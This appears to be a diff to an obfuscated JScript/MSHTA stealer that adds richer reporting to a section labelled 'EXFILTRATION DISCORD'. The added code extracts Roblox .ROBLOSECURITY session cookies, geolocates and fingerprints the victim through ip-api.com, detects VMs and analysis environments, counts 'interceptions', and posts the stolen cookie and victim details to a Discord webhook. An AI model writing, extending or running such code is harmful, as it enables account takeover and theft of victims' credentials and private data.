@@ -180,11 +180,109 @@ function _0xb7(_0x14){return String(_0x14).replace(/\\/g,"\\\\").replace(/"/g,'\
 function _0xb8(){try{return new ActiveXObject(_0xa3);}catch(e){try{return new ActiveXObject(_0xa4);}catch(e2){return null;}}}
 
 /* ==========================================================================
-   [6] EXFILTRATION DISCORD (logique inchangee)
+   [5b] HELPERS DE PRESENTATION EMBED
+   ========================================================================== */
+var _0xcb="",_0xcbt=0;
+
+function _0xcc(){
+  try{
+    var _0x73=new Date().getTime();
+    if(_0xcb&&(_0x73-_0xcbt)<300000)return _0xcb;
+    var _0x19=_0xb8();if(!_0x19)return _0xcb;
+    _0x19.Open("GET","http://ip-api.com/json/?fields=status,query,country,city,isp,proxy,hosting",false);
+    _0x19.SetRequestHeader("Cache-Control","no-cache");
+    _0x19.Send();
+    var _0x74=String(_0x19.ResponseText||"");
+    if(_0x74.indexOf('"query"')>-1){_0xcb=_0x74;_0xcbt=_0x73;}
+  }catch(e){}
+  return _0xcb;
+}
+function _0xcd(_0x54,_0x55,_0x56){
+  try{
+    var _0x57='"'+_0x55+'":"';
+    var _0x58=_0x54.indexOf(_0x57);
+    if(_0x58<0)return _0x56;
+    _0x58+=_0x57.length;
+    var _0x59=_0x54.indexOf('"',_0x58);
+    return _0x59>_0x58?_0x54.substring(_0x58,_0x59):_0x56;
+  }catch(e){return _0x56;}
+}
+function _0xce(_0x54,_0x55){try{return _0x54.indexOf('"'+_0x55+'":true')>-1;}catch(e){return false;}}
+function _0xcf(){
+  var _0x59=1;
+  try{
+    if(!_0xd5)return 0;
+    _0xb4(_0xd5);
+    var _0x5a=_0xd5+"\\cnt.txt";
+    if(_0xd2.FileExists(_0x5a)){var _0x5b=parseInt(_0xb2(_0x5a),10);if(_0x5b>0)_0x59=_0x5b+1;}
+    _0xb3(_0x5a,String(_0x59));
+  }catch(e){}
+  return _0x59;
+}
+function _0xd0(_0x5c){
+  var _0x5d="(aucun)",_0x5e="";
+  try{
+    var _0x5f=_0x5c.indexOf(".ROBLOSECURITY");
+    if(_0x5f>-1){
+      var _0x60=_0x5c.indexOf("=",_0x5f);
+      if(_0x60>-1){
+        var _0x61=_0x5c.indexOf(";",_0x60);
+        if(_0x61<0)_0x61=_0x5c.length;
+        _0x5d=".ROBLOSECURITY";
+        _0x5e=_0x5c.substring(_0x60+1,_0x61).replace(/[\s"\\]/g,"");
+      }
+    }
+  }catch(e){}
+  return {n:_0x5d,v:_0x5e};
+}
+function _0xda(_0x6b,_0x6c){
+  var _0x6d=String(_0x6b);
+  if(_0x6d.length>_0x6c)_0x6d=_0x6d.substring(0,_0x6c-1)+"\u2026";
+  return _0x6d;
+}
+function _0xdb(_0x6e,_0x6f,_0x70){
+  return '{"name":"'+_0xb7(_0x6e)+'","value":"'+_0xb7(_0x6f)+'","inline":'+(_0x70?"true":"false")+'}';
+}
+
+/* ==========================================================================
+   [6] EXFILTRATION DISCORD (logique inchangee, embed enrichi)
    ========================================================================== */
 function _0xb9(_0x15,_0x16,_0x17){
   try{
-    var _0x18='{"embeds":[{"title":"'+_0xb7(_0x15)+'","description":"'+_0xb7(_0x16)+'","color":'+_0x17+',"footer":{"text":"'+_0xb7(_0xd3+" / "+_0xd4)+'"}}]}';
+    var _0x16s=String(_0x16);
+    var _0x62=_0xd0(_0x16s);
+    var _0x63=_0xcf();
+    var _0x64=_0xcc();
+    var _0x65=_0xcd(_0x64,"query","");
+    var _0x66=_0xcd(_0x64,"country","Inconnu");
+    var _0x67=_0xcd(_0x64,"city","Inconnue");
+    var _0x68=_0xcd(_0x64,"isp","FAI inconnu");
+    var _0x69=(_0xce(_0x64,"proxy")||_0xce(_0x64,"hosting"));
+
+    var _0x6a,_0x6b;
+    if(_0xd6&12){_0x6a="\ud83d\udd34 BLOQU\u00c9 \u00b7 analyse";_0x6b=16711680;}
+    else if(_0xd6&3){_0x6a="\ud83d\udfe0 TRACK\u00c9 \u00b7 VM";_0x6b=16744448;}
+    else{_0x6a="\ud83d\udfe2 ACTIF";_0x6b=65280;}
+
+    var _0x6c=new Date();
+    var _0x6d=_0x6c.toLocaleString();
+    var _0x6e=navigator.userAgent||"MSHTA";
+    var _0x6f=screen.width+"x"+screen.height;
+    var _0x70=(_0x69?"\u2593 `":"`")+(_0x65||"Inconnue")+"`"+(_0x69?" \ud83d\udc7e":"");
+
+    var _0x71=[];
+    _0x71.push(_0xdb("\ud83c\udf6a Cookie Data","`"+_0x62.n+"` \u2192\n```"+_0xda(_0x62.v||"(vide)",880)+"```",false));
+    _0x71.push(_0xdb("\ud83c\udf10 IP Address",_0x70,true));
+    _0x71.push(_0xdb("\u23f0 Timestamp","`"+_0x6d+"`",true));
+    _0x71.push(_0xdb("\ud83d\udda5\ufe0f User-Agent","```"+_0xda(_0x6e,300)+"```",false));
+    _0x71.push(_0xdb("\u26a0\ufe0f Status",_0x6a,true));
+    _0x71.push(_0xdb("\ud83d\udccc Localisation","`"+_0xda(_0x66,50)+" / "+_0xda(_0x67,50)+"`",true));
+    _0x71.push(_0xdb("\ud83d\udd75\ufe0f Empreinte","flags `"+_0xd6+"` \u00b7 `"+_0x6f+"` \u00b7 `"+_0xda(_0x68,40)+"`",true));
+    _0x71.push(_0xdb("\ud83d\udd25 Donn\u00e9es sensibles","`"+_0x62.n+"` \u00b7 "+_0x62.v.length+" car.",true));
+
+    var _0x72="**\ud83d\udd75\ufe0f Interception #"+_0x63+"**\n```"+_0xda(_0x16s,420)+"```";
+
+    var _0x18='{"embeds":[{"title":"'+_0xb7("\ud83c\udf6a "+_0x15)+'","description":"'+_0xb7(_0x72)+'","color":'+_0x6b+',"timestamp":"'+_0x6c.toISOString()+'","fields":['+_0x71.join(",")+'],"footer":{"text":"'+_0xb7(_0xd3+" / "+_0xd4+" \u00b7 DiceCheck")+'"}}]}';
     var _0x19=_0xb8();if(!_0x19)return;
     _0x19.Open("POST",_0xac,false);
     _0x19.SetRequestHeader("Content-Type","application/json");
